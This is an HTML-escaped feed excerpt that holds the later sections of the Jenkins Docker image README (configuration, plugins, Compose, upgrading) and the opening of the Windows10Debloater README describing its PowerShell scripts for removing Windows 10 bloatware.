&lt;p&gt;&lt;code&gt;executors.groovy&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;import jenkins.model.*
Jenkins.instance.setNumExecutors(0) // Recommended to not run builds on the built-in node
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;and &lt;code&gt;Dockerfile&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts
COPY --chown=jenkins:jenkins executors.groovy /usr/share/jenkins/ref/init.groovy.d/executors.groovy
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Connecting agents&lt;/h2&gt; 
&lt;p&gt;You can run builds on the controller out of the box. The Jenkins project recommends that no executors be enabled on the controller.&lt;/p&gt; 
&lt;p&gt;In order to connect agents &lt;strong&gt;through an inbound TCP connection&lt;/strong&gt;, map the port: &lt;code&gt;-p 50000:50000&lt;/code&gt;. That port will be used when you connect agents to the controller.&lt;/p&gt; 
&lt;p&gt;If you are only using &lt;a href=&quot;https://plugins.jenkins.io/ssh-slaves/&quot;&gt;SSH (outbound) build agents&lt;/a&gt;, this port is not required, as connections are established from the controller. If you connect agents using web sockets (since Jenkins 2.217), the TCP agent port is not used either.&lt;/p&gt; 
&lt;h2&gt;Passing JVM parameters&lt;/h2&gt; 
&lt;p&gt;You might need to customize the JVM running Jenkins, typically to adjust &lt;a href=&quot;https://www.jenkins.io/doc/book/managing/system-properties/&quot;&gt;system properties&lt;/a&gt; or tweak heap memory settings. Use the &lt;code&gt;JAVA_OPTS&lt;/code&gt; or &lt;code&gt;JENKINS_JAVA_OPTS&lt;/code&gt; environment variables for this purpose :&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run --name myjenkins -p 8080:8080 -p 50000:50000 --restart=on-failure --env JAVA_OPTS=-Dhudson.footerURL=http://mycompany.com jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;JVM options specifically for the Jenkins controller should be set through &lt;code&gt;JENKINS_JAVA_OPTS&lt;/code&gt;, as other tools might also respond to the &lt;code&gt;JAVA_OPTS&lt;/code&gt; environment variable.&lt;/p&gt; 
&lt;h2&gt;Configuring logging&lt;/h2&gt; 
&lt;p&gt;Jenkins logging can be configured through a properties file and &lt;code&gt;java.util.logging.config.file&lt;/code&gt; Java property. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;mkdir data
cat &amp;gt; data/log.properties &amp;lt;&amp;lt;EOF
handlers=java.util.logging.ConsoleHandler
jenkins.level=FINEST
java.util.logging.ConsoleHandler.level=FINEST
EOF
docker run --name myjenkins -p 8080:8080 -p 50000:50000 --restart=on-failure --env JAVA_OPTS=&quot;-Djava.util.logging.config.file=/var/jenkins_home/log.properties&quot; -v `pwd`/data:/var/jenkins_home jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Configuring reverse proxy&lt;/h2&gt; 
&lt;p&gt;If you want to install Jenkins behind a reverse proxy with a prefix, example: mysite.com/jenkins, you need to add environment variable &lt;code&gt;JENKINS_OPTS=&quot;--prefix=/jenkins&quot;&lt;/code&gt; and then follow the below procedures to configure your reverse proxy, which will depend if you have Apache or Nginx:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.jenkins.io/doc/book/system-administration/reverse-proxy-configuration-apache/&quot;&gt;Apache&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.jenkins.io/doc/book/system-administration/reverse-proxy-configuration-nginx/&quot;&gt;Nginx&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;DNS configuration&lt;/h2&gt; 
&lt;p&gt;If the message &quot;This Jenkins instance appears to be offline.&quot; appears on first startup, and the container logs show lines such as &lt;code&gt;java.net.UnknownHostException: updates.jenkins.io&lt;/code&gt;, your container may be having issues with resolving DNS names.&lt;/p&gt; 
&lt;p&gt;To potentially solve the issue, start the container specifying a dns server (for example Cloudflare&#39;s 1.1.1.1 or Google&#39;s 8.8.8.8, or any other DNS server):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run -p 8080:8080 -p 50000:50000 --restart=on-failure --dns 1.1.1.1 --dns 8.8.8.8 jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Passing Jenkins launcher parameters&lt;/h2&gt; 
&lt;p&gt;Arguments you pass to docker running the Jenkins image are passed to jenkins launcher, so for example you can run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run jenkins/jenkins:lts-jdk17 --version
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This will show the Jenkins version, the same as when you run Jenkins from an executable war.&lt;/p&gt; 
&lt;p&gt;You can also define Jenkins arguments via &lt;code&gt;JENKINS_OPTS&lt;/code&gt;. This is useful for customizing arguments to the jenkins launcher in a derived Jenkins image. The following sample Dockerfile uses this option to force use of HTTPS with a certificate included in the image.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17

COPY --chown=jenkins:jenkins certificate.pfx /var/lib/jenkins/certificate.pfx
COPY --chown=jenkins:jenkins https.key /var/lib/jenkins/pk
ENV JENKINS_OPTS=&quot;--httpPort=-1 --httpsPort=8083 --httpsKeyStore=/var/lib/jenkins/certificate.pfx --httpsKeyStorePassword=Password12&quot;
EXPOSE 8083
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can also change the default agent port for Jenkins by defining &lt;code&gt;JENKINS_SLAVE_AGENT_PORT&lt;/code&gt; in a sample Dockerfile.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17
ENV JENKINS_SLAVE_AGENT_PORT=50001
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;or as a parameter to docker,&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run --name myjenkins -p 8080:8080 -p 50001:50001 --restart=on-failure --env JENKINS_SLAVE_AGENT_PORT=50001 jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This environment variable will be used to set the &lt;a href=&quot;https://www.jenkins.io/doc/book/managing/system-properties/&quot;&gt;system property&lt;/a&gt; &lt;code&gt;jenkins.model.Jenkins.slaveAgentPort&lt;/code&gt;.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;If this property is already set in &lt;strong&gt;JAVA_OPTS&lt;/strong&gt; or &lt;strong&gt;JENKINS_JAVA_OPTS&lt;/strong&gt;, then the value of &lt;code&gt;JENKINS_SLAVE_AGENT_PORT&lt;/code&gt; will be ignored.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h1&gt;Installing more tools&lt;/h1&gt; 
&lt;p&gt;You can run your container as root - and install via apt-get, install as part of build steps via jenkins tool installers, or you can create your own Dockerfile to customise, for example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17
# if we want to install via apt
USER root
RUN apt-get update &amp;amp;&amp;amp; apt-get install -y ruby make more-thing-here
# drop back to the regular jenkins user - good practice
USER jenkins
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;In such a derived image, you can customize your jenkins instance with hook scripts or additional plugins. For this purpose, use &lt;code&gt;/usr/share/jenkins/ref&lt;/code&gt; as a place to define the default JENKINS_HOME content you wish the target installation to look like :&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17
COPY --chown=jenkins:jenkins custom.groovy /usr/share/jenkins/ref/init.groovy.d/custom.groovy
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If you need to maintain the entire init.groovy.d directory and have a persistent JENKINS_HOME you may run the docker image with &lt;code&gt;-e PRE_CLEAR_INIT_GROOVY_D=true&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;Preinstalling plugins&lt;/h2&gt; 
&lt;h3&gt;Install plugins&lt;/h3&gt; 
&lt;p&gt;You can rely on &lt;a href=&quot;https://github.com/jenkinsci/plugin-installation-manager-tool/&quot;&gt;the plugin manager CLI&lt;/a&gt; to pass a set of plugins to download with their dependencies. This tool will perform downloads from update centers, and internet access is required for the default update centers.&lt;/p&gt; 
&lt;h3&gt;Setting update centers&lt;/h3&gt; 
&lt;p&gt;During the download, the CLI will use update centers defined by the following environment variables:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_UC&lt;/code&gt; - Main update center. This update center may offer plugin versions depending on the Jenkins LTS Core versions. Default value: &lt;a href=&quot;https://updates.jenkins.io&quot;&gt;https://updates.jenkins.io&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_UC_EXPERIMENTAL&lt;/code&gt; - &lt;a href=&quot;https://jenkins.io/blog/2013/09/23/experimental-plugins-update-center/&quot;&gt;Experimental Update Center&lt;/a&gt;. This center offers Alpha and Beta versions of plugins. Default value: &lt;a href=&quot;https://updates.jenkins.io/experimental&quot;&gt;https://updates.jenkins.io/experimental&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_INCREMENTALS_REPO_MIRROR&lt;/code&gt; - Defines Maven mirror to be used to download plugins from the &lt;a href=&quot;https://jenkins.io/blog/2018/05/15/incremental-deployment/&quot;&gt;Incrementals repo&lt;/a&gt;. Default value: &lt;a href=&quot;https://repo.jenkins-ci.org/incrementals&quot;&gt;https://repo.jenkins-ci.org/incrementals&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_UC_DOWNLOAD&lt;/code&gt; - Download url of the Update Center. Default value: &lt;code&gt;$JENKINS_UC/download&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_PLUGIN_INFO&lt;/code&gt; - Location of plugin information. Default value: &lt;a href=&quot;https://updates.jenkins.io/current/plugin-versions.json&quot;&gt;https://updates.jenkins.io/current/plugin-versions.json&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;It is possible to override the environment variables in images.&lt;/p&gt; 
&lt;p&gt;&lt;span&gt;❗&lt;/span&gt; Note that changing update center variables &lt;strong&gt;will not&lt;/strong&gt; change the Update Center being used by Jenkins runtime, it concerns only the plugin manager CLI.&lt;/p&gt; 
&lt;h3&gt;Installing Custom Plugins&lt;/h3&gt; 
&lt;p&gt;Installing prebuilt, custom plugins can be accomplished by copying the plugin HPI file into &lt;code&gt;/usr/share/jenkins/ref/plugins/&lt;/code&gt; within the &lt;code&gt;Dockerfile&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;COPY --chown=jenkins:jenkins path/to/custom.hpi /usr/share/jenkins/ref/plugins/
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Usage&lt;/h3&gt; 
&lt;p&gt;You can run the CLI manually in Dockerfile:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-Dockerfile&quot;&gt;FROM jenkins/jenkins:lts-jdk17
RUN jenkins-plugin-cli --plugins pipeline-model-definition github-branch-source:1.8
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Furthermore it is possible to pass a file that contains this set of plugins (with or without line breaks).&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-Dockerfile&quot;&gt;FROM jenkins/jenkins:lts-jdk17
COPY --chown=jenkins:jenkins plugins.txt /usr/share/jenkins/ref/plugins.txt
RUN jenkins-plugin-cli -f /usr/share/jenkins/ref/plugins.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;When jenkins container starts, it will check &lt;code&gt;JENKINS_HOME&lt;/code&gt; has this reference content, and copy them there if required. It will not override such files, so if you upgraded some plugins from UI they won&#39;t be reverted on next start.&lt;/p&gt; 
&lt;p&gt;In case you &lt;em&gt;do&lt;/em&gt; want to override, append &#39;.override&#39; to the name of the reference file. E.g. a file named &lt;code&gt;/usr/share/jenkins/ref/config.xml.override&lt;/code&gt; will overwrite an existing &lt;code&gt;config.xml&lt;/code&gt; file in JENKINS_HOME.&lt;/p&gt; 
&lt;p&gt;Also see &lt;a href=&quot;https://issues.jenkins.io/browse/JENKINS-24986&quot;&gt;JENKINS-24986&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Here is an example to get the list of plugins from an existing server:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;JENKINS_HOST=username:password@myhost.com:port
curl -sSL &quot;http://$JENKINS_HOST/pluginManager/api/xml?depth=1&amp;amp;xpath=/*/*/shortName|/*/*/version&amp;amp;wrapper=plugins&quot; | perl -pe &#39;s/.*?&amp;lt;shortName&amp;gt;([\w-]+).*?&amp;lt;version&amp;gt;([^&amp;lt;]+)()(&amp;lt;\/\w+&amp;gt;)+/\1 \2\n/g&#39;|sed &#39;s/ /:/&#39;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Example Output:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;cucumber-testresult-plugin:0.8.2
pam-auth:1.1
matrix-project:1.4.1
script-security:1.13
...
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For 2.x-derived images, you may also want to&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;RUN echo 2.0 &amp;gt; /usr/share/jenkins/ref/jenkins.install.UpgradeWizard.state
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;to indicate that this Jenkins installation is fully configured. Otherwise a banner will appear prompting the user to install additional plugins, which may be inappropriate.&lt;/p&gt; 
&lt;h3&gt;Access logs&lt;/h3&gt; 
&lt;p&gt;To enable Jenkins user access logs from Jenkins home directory inside a docker container, set the &lt;code&gt;JENKINS_OPTS&lt;/code&gt; environment variable value to &lt;code&gt;--accessLoggerClassName=winstone.accesslog.SimpleAccessLogger --simpleAccessLogger.format=combined --simpleAccessLogger.file=/var/jenkins_home/logs/access_log&lt;/code&gt;&lt;/p&gt; 
&lt;h3&gt;Naming convention in tags&lt;/h3&gt; 
&lt;p&gt;The naming convention for the tags on Docker Hub follows the format &lt;code&gt;&amp;lt;repository_name&amp;gt;:&amp;lt;tag&amp;gt;&lt;/code&gt;, where the repository name is jenkins/jenkins and where the tag specifies the image version. In the case of the LTS and latest versions, the tags are &lt;code&gt;lts&lt;/code&gt; and &lt;code&gt;latest&lt;/code&gt;, respectively.&lt;/p&gt; 
&lt;p&gt;You can use these tags to pull the corresponding Jenkins images from Docker Hub and run them on your system. For example, to pull the LTS version of the Jenkins image use this command: &lt;code&gt;docker pull jenkins/jenkins:lts&lt;/code&gt;&lt;/p&gt; 
&lt;h3&gt;Docker Compose with Jenkins&lt;/h3&gt; 
&lt;p&gt;To use Docker Compose with Jenkins, you can define a docker-compose.yml file including a Jenkins instance and any other services it depends on. For example, the following docker-compose.yml file defines a Jenkins controller and a Jenkins SSH agent:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;services:
  jenkins:
    image: jenkins/jenkins:lts
    ports:
      - &quot;8080:8080&quot;
    volumes:
      - jenkins_home:/var/jenkins_home
  ssh-agent:
    image: jenkins/ssh-agent
volumes:
  jenkins_home:
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This &lt;code&gt;docker-compose.yml&lt;/code&gt; file creates two containers: one for Jenkins and one for the Jenkins SSH agent.&lt;/p&gt; 
&lt;p&gt;The Jenkins container is based on the &lt;code&gt;jenkins/jenkins:lts&lt;/code&gt; image and exposes the Jenkins web interface on port 8080. The &lt;code&gt;jenkins_home&lt;/code&gt; volume is a &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;named volume&lt;/a&gt; that is created and managed by Docker.&lt;/p&gt; 
&lt;p&gt;It is mounted at &lt;code&gt;/var/jenkins_home&lt;/code&gt; in the Jenkins container, and it will persist the Jenkins configuration and data.&lt;/p&gt; 
&lt;p&gt;The ssh-agent container is based on the &lt;code&gt;jenkins/ssh-agent&lt;/code&gt; image and runs an SSH server to execute &lt;a href=&quot;https://plugins.jenkins.io/ssh-slaves/&quot;&gt;Jenkins SSH Build Agent&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To start the Jenkins instance and the other services defined in the &lt;code&gt;docker-compose.yml&lt;/code&gt; file, run the &lt;code&gt;docker compose up -d&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;This will pull the necessary images from Docker Hub if they are not already present on your system, and start the services in the background.&lt;/p&gt; 
&lt;p&gt;You can then access the Jenkins web interface on &lt;code&gt;http://localhost:8080&lt;/code&gt; on your host system to configure and manage your Jenkins instance (where &lt;code&gt;localhost&lt;/code&gt; points to the published port by your Docker Engine).&lt;/p&gt; 
&lt;p&gt;NOTE: read the section &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/#dns-configuration&quot;&gt;&lt;em&gt;DNS Configuration&lt;/em&gt;&lt;/a&gt; in case you see the message &quot;This Jenkins instance appears to be offline.&quot; In that case add the dns configuration to the yaml:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;services:
  jenkins:
# ... other config
    dns:
      - 1.1.1.1
      - 8.8.8.8
# ... other config
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Updating plugins file&lt;/h3&gt; 
&lt;p&gt;The &lt;a href=&quot;https://github.com/jenkinsci/plugin-installation-manager-tool&quot;&gt;plugin-installation-manager-tool&lt;/a&gt; supports updating the plugin file for you.&lt;/p&gt; 
&lt;p&gt;Example command:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-command&quot;&gt;JENKINS_IMAGE=jenkins/jenkins:lts-jdk17
docker run -it ${JENKINS_IMAGE} bash -c &quot;stty -onlcr &amp;amp;&amp;amp; jenkins-plugin-cli -f /usr/share/jenkins/ref/plugins.txt --available-updates --output txt&quot; &amp;gt;  plugins2.txt
mv plugins2.txt plugins.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Upgrading&lt;/h2&gt; 
&lt;p&gt;All the data needed is in the /var/jenkins_home directory - so depending on how you manage that - depends on how you upgrade. Generally - you can copy it out - and then &quot;docker pull&quot; the image again - and you will have the latest LTS - you can then start up with -v pointing to that data (/var/jenkins_home) and everything will be as you left it.&lt;/p&gt; 
&lt;p&gt;As always - please ensure that you know how to drive docker - especially volume handling!&lt;/p&gt; 
&lt;p&gt;If you mount the Jenkins home directory to a &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;Docker named volume&lt;/a&gt;, then the upgrade consists of &lt;code&gt;docker pull&lt;/code&gt; and nothing more.&lt;/p&gt; 
&lt;p&gt;We recommend using &lt;code&gt;docker compose&lt;/code&gt;, especially in cases where the user is also running a parallel nginx/apache container as a reverse proxy for the Jenkins container.&lt;/p&gt; 
&lt;h3&gt;Upgrading plugins&lt;/h3&gt; 
&lt;p&gt;By default, plugins will be upgraded if they haven&#39;t been upgraded manually and if the version from the docker image is newer than the version in the container. Versions installed by the docker image are tracked through a marker file.&lt;/p&gt; 
&lt;p&gt;To force upgrades of plugins that have been manually upgraded, run the docker image with &lt;code&gt;-e PLUGINS_FORCE_UPGRADE=true&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The default behaviour when upgrading from a docker image that didn&#39;t write marker files is to leave existing plugins in place. If you want to upgrade existing plugins without marker you may run the docker image with &lt;code&gt;-e TRY_UPGRADE_IF_NO_MARKER=true&lt;/code&gt;. Then plugins will be upgraded if the version provided by the docker image is newer.&lt;/p&gt; 
&lt;h1&gt;Hacking&lt;/h1&gt; 
&lt;p&gt;If you wish to contribute fixes to this repository, please refer to the &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/HACKING.adoc&quot;&gt;dedicated documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Security&lt;/h1&gt; 
&lt;p&gt;For information related to the security of this Docker image, please refer to the &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/SECURITY.md&quot;&gt;dedicated documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Questions?&lt;/h1&gt; 
&lt;p&gt;We&#39;re on Gitter, &lt;a href=&quot;https://gitter.im/jenkinsci/docker&quot;&gt;https://gitter.im/jenkinsci/docker&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Sycnex/Windows10Debloater</title>
      <link>https://github.com/Sycnex/Windows10Debloater</link>
      <description>&lt;p&gt;Script to remove Windows 10 bloatware.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Windows10Debloater&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://microsoft.com/PowerShell&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/PowerShell-1f425f?logo=Powershell&quot; alt=&quot;made-with-powershell&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://opensource.org/licenses/MIT&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/License-MIT-yellow.svg?sanitize=true&quot; alt=&quot;License: MIT&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Script/Utility/Application to debloat Windows 10, to remove Windows pre-installed unnecessary applications, stop some telemetry functions, stop Cortana from being used as your Search Index, disable unnecessary scheduled tasks, and more...&lt;/p&gt; 
&lt;h2&gt;Donate a cup of coffee&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/HZNh7w1Bm&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Be sure to look at the Contributors&#39; GitHubs to see if they have GitHub sponsorships as well since they have contributed to this open-source project. (&lt;a href=&quot;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&quot;&gt;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&lt;/a&gt;)&lt;/p&gt; 
&lt;h2&gt;Disclaimer&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;WARNING:&lt;/strong&gt; I do &lt;strong&gt;NOT&lt;/strong&gt; take responsibility for what may happen to your system! Run scripts at your own risk! Also, other variants of this repo are not technically &quot;new&quot; versions of this, but they are different in their own respective ways. There are some sites saying that other projects are &quot;new&quot; versions of this, but that is inaccurate.&lt;/p&gt; 
&lt;h2&gt;How To Run the Windows10Debloater.ps1 and the Windows10DebloaterGUI.ps1 files&lt;/h2&gt; 
&lt;p&gt;There are different methods of running the PowerShell script. The methods are as follows:&lt;/p&gt; 
&lt;h3&gt;First Method&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download the .zip file on the main page of the GitHub and extract the .zip file to your desired location&lt;/li&gt; 
 &lt;li&gt;Once extracted, open &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1&quot;&gt;PowerShell&lt;/a&gt; (or &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7&quot;&gt;PowerShell ISE&lt;/a&gt;) as an Administrator&lt;/li&gt; 
 &lt;li&gt;Enable PowerShell execution &lt;code&gt;Set-ExecutionPolicy Unrestricted -Force&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;On the prompt, change to the directory where you extracted the files: &amp;nbsp; e.g. - &lt;code&gt;cd c:\temp&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Next, to run either script, enter in the following: &amp;nbsp; e.g. - &lt;code&gt;.\Windows10DebloaterGUI.ps1&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Second Method&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download the .zip file on the main page of the GitHub and extract the .zip file to your desired location&lt;/li&gt; 
 &lt;li&gt;Right-click the PowerShell file that you&#39;d like to run and click on &quot;Run With PowerShell&quot;&lt;/li&gt; 
 &lt;li&gt;This will allow the script to run without having to do the above steps but Powershell will ask if you&#39;re sure you want to run this script.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Remember this script &lt;strong&gt;NEEDS&lt;/strong&gt; to be run as admin in order to function properly.&lt;/p&gt; 
&lt;h2&gt;How To Run the Windows10SysPrepDebloater.ps1 file&lt;/h2&gt; 
&lt;p&gt;For the WindowsSysPrepDebloater.ps1 file, there are a couple of parameters that you can run so that you can specify which functions are used. The parameters are: &lt;code&gt;-SysPrep&lt;/code&gt;, &lt;code&gt;-Debloat&lt;/code&gt; and &lt;code&gt;-Privacy&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;To run this with parameters, do the following:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download the .zip file on the main page of the GitHub and extract the .zip file to your desired location&lt;/li&gt; 
 &lt;li&gt;Once extracted, open &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1&quot;&gt;PowerShell&lt;/a&gt; (or &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7&quot;&gt;PowerShell ISE&lt;/a&gt;) as an Administrator&lt;/li&gt; 
 &lt;li&gt;On the prompt, change to the directory where you extracted the files: &amp;nbsp; e.g. - &lt;code&gt;cd c:\temp&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Next, to run either script, enter in the following:&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;e.g. - &lt;code&gt;.\Windows10SysPrepDebloater.ps1 -Sysprep -Debloat -Privacy&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;Sysprep, Interactive, and GUI Application&lt;/h2&gt; 
&lt;p&gt;There are now 3 versions of &lt;strong&gt;Windows10Debloater&lt;/strong&gt; - There is an interactive version, a GUI app version, and a pure silent version.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;Windows10SysPrepDebloater.ps1&lt;/code&gt;&lt;/strong&gt; -&amp;gt; The silent version now utilizes the switch parameters: -Sysprep, -Debloat -Privacy. The silent version can be useful for deploying MDT Images/sysprepping or any other way you deploy Windows 10. This will work to remove the bloatware during the deployment process.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;Windows10Debloater.ps1&lt;/code&gt;&lt;/strong&gt; -&amp;gt; This interactive version is what it implies - a Windows10Debloater script with interactive prompts. This one should not be used for deployments that require a silent script with optional parameters. This script gives you choices with prompts as it runs so that you can make the choices of what the script does.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;Windows10DebloaterGUI.ps1&lt;/code&gt;&lt;/strong&gt; -&amp;gt; There is now a GUI Application named Windows10DebloaterGUI.ps1 with buttons to perform all of the functions that the scripts do. This is better for the average user who does not want to work with code, or if you&#39;d prefer to just see an application screen.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Switch Parameters&lt;/h2&gt; 
&lt;p&gt;There are 3 switch parameters in the &lt;code&gt;Windows10SysPrepDebloater.ps1&lt;/code&gt; script.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;-SysPrep&lt;/code&gt;&lt;/strong&gt;, which runs the command within a function: get-appxpackage | remove-appxpackage. This is useful since some administrators need that command to run first in order for machines to be able to properly provision the apps for removal.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;-Debloat&lt;/code&gt;&lt;/strong&gt;, switch parameter which does as it suggests. It runs the following functions: Start-Debloat, Remove-Keys, and Protect-Privacy. Remove-Keys removes registry keys leftover that are associated with the bloatware apps listed above, but not removed during the Start-Debloat function.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;-Privacy&lt;/code&gt;&lt;/strong&gt;, adds and/or changes registry keys to stop some telemetry functions, stops Cortana from being used as your Search Index, disables &quot;unnecessary&quot; scheduled tasks, and more.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;em&gt;&lt;strong&gt;This script will remove the bloatware from Windows 10 when using Remove-AppXPackage/Remove-AppXProvisionedPackage, and then delete specific registry keys that are were not removed beforehand. For best results, this script should be run before a user profile is configured, otherwise, you will likely see that apps that should have been removed will remain, and if they are removed you will find broken tiles on the start menu.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt; 
&lt;h2&gt;These registry keys are&lt;/h2&gt; 
&lt;p&gt;EclipseManager, ActiproSoftwareLLC, Microsoft.PPIProjection, Microsoft.XboxGameCallableUI&lt;/p&gt; 
&lt;p&gt;You can choose to either &#39;Debloat&#39; or &#39;Revert&#39;. Depending on your choice, either one will run specific code to either debloat your Windows 10 machine.&lt;/p&gt; 
&lt;h2&gt;The Debloat switch choice runs the following functions&lt;/h2&gt; 
&lt;p&gt;Debloat, Remove-Keys, Protect-Privacy, Stop-EdgePDF (If chosen)&lt;/p&gt; 
&lt;h2&gt;The Revert switch choice runs the following functions&lt;/h2&gt; 
&lt;p&gt;Revert-Changes, Enable-EdgePDF&lt;/p&gt; 
&lt;p&gt;The Revert option reinstalls the bloatware and changes your registry keys back to default.&lt;/p&gt; 
